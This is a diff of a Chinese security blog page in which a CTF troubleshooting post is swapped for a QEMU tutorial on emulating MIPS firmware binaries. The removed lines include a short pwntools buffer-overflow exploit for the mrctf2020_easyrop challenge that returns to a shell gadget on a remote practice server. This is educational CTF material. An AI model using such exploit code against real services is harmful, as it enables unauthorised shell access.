@@ -16,23 +16,24 @@
   <meta name="author" content="Isolator">
   <meta name="keywords" content="">
   
-    <meta name="description" content="解决或未解决的奇怪问题">
+    <meta name="description" content="qemu的user-mode使用方法">
 <meta property="og:type" content="article">
-<meta property="og:title" content="遇到的奇奇怪怪问题汇总">
-<meta property="og:url" content="https://isolator-1.github.io/2022/11/29/%E6%9D%82%E9%A1%B9/%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:title" content="qemu的安装与仿真第一个mips程序">
+<meta property="og:url" content="https://isolator-1.github.io/2022/12/23/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/%E5%A6%82%E4%BD%95%E7%94%A8qemu%E4%BB%BF%E7%9C%9Fmips%E7%A8%8B%E5%BA%8F/index.html">
 <meta property="og:site_name" content="Isolator&#39;s Blog">
-<meta property="og:description" content="解决或未解决的奇怪问题">
+<meta property="og:description" content="qemu的user-mode使用方法">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-11-29T13:35:00.000Z">
-<meta property="article:modified_time" content="2023-01-03T05:40:35.189Z">
+<meta property="og:image" content="https://isolator-1.github.io/img/qemu/1.jpg">
+<meta property="article:published_time" content="2022-12-23T07:33:00.000Z">
+<meta property="article:modified_time" content="2023-01-03T05:43:32.197Z">
 <meta property="article:author" content="Isolator">
-<meta property="article:tag" content="ctf-pwn">
-<meta property="article:tag" content="Others">
+<meta property="article:tag" content="firmware analysis">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/qemu/1.jpg">
   
   
   
-  <title>遇到的奇奇怪怪问题汇总 - Isolator&#39;s Blog</title>
+  <title>qemu的安装与仿真第一个mips程序 - Isolator&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -197,7 +198,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="遇到的奇奇怪怪问题汇总"></span>
+            <span id="subtitle" data-typed-text="qemu的安装与仿真第一个mips程序"></span>
           
         </div>
 
@@ -208,8 +209,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-29 21:35" pubdate>
-          November 29, 2022 pm
+        <time datetime="2022-12-23 15:33" pubdate>
+          December 23, 2022 pm
         </time>
       </span>
     
@@ -220,7 +221,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          864 words
+          604 words
         
       </span>
     
@@ -231,7 +232,7 @@
         
         
         
-          8 mins
+          6 mins
         
       </span>
     
@@ -269,24 +270,26 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">遇到的奇奇怪怪问题汇总</h1>
+            <h1 style="display: none">qemu的安装与仿真第一个mips程序</h1>
             
             
               <div class="markdown-body">
                 
-                <h4 id="sleep-？"><a href="#sleep-？" class="headerlink" title="sleep ？"></a>sleep ？</h4><p>题目：</p>
-<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#mrctf2020_easyrop">https://buuoj.cn/challenges#mrctf2020_easyrop</a></p>
-<p>本来是很简单的一个溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment">#r = process(&#x27;./mrctf2020_easyrop&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25663</span>)<br>system_sh =<span class="hljs-number">0x000000000040072A</span><br>r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x300</span>)<br>r.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)<br><span class="hljs-comment">#sleep(1)</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>* <span class="hljs-number">0x12</span> + p64(system_sh))<br>r.interactive()<br></code></pre></td></tr></table></figure>
+                <h4 id="QEMU安装"><a href="#QEMU安装" class="headerlink" title="QEMU安装"></a>QEMU安装</h4><p>QEMU仿真程序分为两类：使用者模式（User Mode）、系统模式（System Mode）。区别在于User Mode只仿真单个程序，而System Mode仿真整个计算机系统，类似vmware</p>
+<h5 id="使用者模式"><a href="#使用者模式" class="headerlink" title="使用者模式"></a>使用者模式</h5><p>安装：<code>sudo apt-get install qemu-user[-static]</code></p>
+<p>使用（以mips为例）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &lt;path-to-fsroot&gt;<br>cp $(which qemu-mipsel-static) ./<br>sudo chroot . ./qemu-mipsel-static &lt;path-to-elf&gt;<br></code></pre></td></tr></table></figure>
 
-<p>但是不加sleep无法通过</p>
-<p>有人说是python同时发送多个字符串时会合并(?)</p>
-<p>那什么时候情况下需要在sendline前面加一个sleep</p>
-<p>​    [已解决] 打本地不加应该没事，打远程的时候肯定会有一点延迟，假如没有sendafter这一类的发送，就可能会造成后面的也一起发送了，所以每次写exp发送的时候最好用sendafter或者sendlineafter这样的话就不需要再担心sleep(1)了</p>
-<hr>
-<h4 id="binwalk提取固件时快捷方式指向-dev-null"><a href="#binwalk提取固件时快捷方式指向-dev-null" class="headerlink" title="binwalk提取固件时快捷方式指向/dev/null"></a>binwalk提取固件时快捷方式指向/dev/null</h4><p>binwalk提取固件时会有一个warning</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WARNING: Symlink points outside of the extraction directory: <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>dir815_FW_101<span class="hljs-regexp">/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/</span>squashfs-root<span class="hljs-regexp">/htdocs/</span>web<span class="hljs-regexp">/dlcfg.cgi -&gt; /</span>htdocs<span class="hljs-regexp">/cgibin; changing link target to /</span>dev/<span class="hljs-keyword">null</span> <span class="hljs-keyword">for</span> security purposes.<br></code></pre></td></tr></table></figure>
-
+<p>对于32位小端序（LSB）程序，使用<code>qemu-mipsel</code>来仿真，32位MSB程序，使用<code>qemu-mips</code>来仿真</p>
+<p>一个小端序的仿真示例：</p>
+<p><img src="/img/qemu/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>Q1：为什么要加 -static ？</p>
+<p>A1：xxx-static表示使用静态链接的qemu程序，不依赖外部动态链接程序，由于使用是要chroot改变根目录，原本的动态链接库会无法找到，除非使用ldd命令把所有依赖全都复制到新的根目录下，否则无法运行。</p>
+<p>而且真的复制动态链接库过来可能会和原本存在的文件重名（我猜的，没验证过😅）</p>
+</blockquote>
+<h5 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h5><p>不管了，直接用fap（</p>
+<p>见上一篇文章 <a href="https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/">https://isolator-1.github.io/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/</a></p>
 
                 
               </div>
@@ -305,7 +308,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%9D%82%E9%A1%B9/" class="category-chain-item">杂项</a>
+  <a href="/categories/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/" class="category-chain-item">固件仿真</a>
   
   
 
@@ -320,9 +323,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
-      
-        <a href="/tags/Others/">#Others</a>
+        <a href="/tags/firmware-analysis/">#firmware analysis</a>
       
     </div>
   
@@ -334,8 +335,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>遇到的奇奇怪怪问题汇总</div>
-      <div>https://isolator-1.github.io/2022/11/29/杂项/遇到的奇奇怪怪问题汇总/</div>
+      <div>qemu的安装与仿真第一个mips程序</div>
+      <div>https://isolator-1.github.io/2022/12/23/固件仿真/如何用qemu仿真mips程序/</div>
     </div>
     <div class="license-meta">
       
@@ -347,7 +348,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>November 29, 2022</div>
+          <div>December 23, 2022</div>
         </div>
       
       
@@ -379,9 +380,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/12/11/%E6%9D%82%E9%A1%B9/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/" title="菜鸡的2022datacon记录">
+                      <a href="/2022/12/23/mips%E6%B1%87%E7%BC%96/mips%E6%B1%87%E7%BC%96/" title="mip汇编">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">菜鸡的2022datacon记录</span>
+                        <span class="hidden-mobile">mip汇编</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -389,8 +390,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/11/29/ctf-pwn/%5BZJCTF%202019%5DEasyHeap/" title="ZJCTF 2019 EasyHeap">
-                        <span class="hidden-mobile">ZJCTF 2019 EasyHeap</span>
+                      <a href="/2022/12/17/%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F/CVE-2019-17621/" title="CVE-2019-17621 dlink-822 命令注入漏洞复现">
+                        <span class="hidden-mobile">CVE-2019-17621 dlink-822 命令注入漏洞复现</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
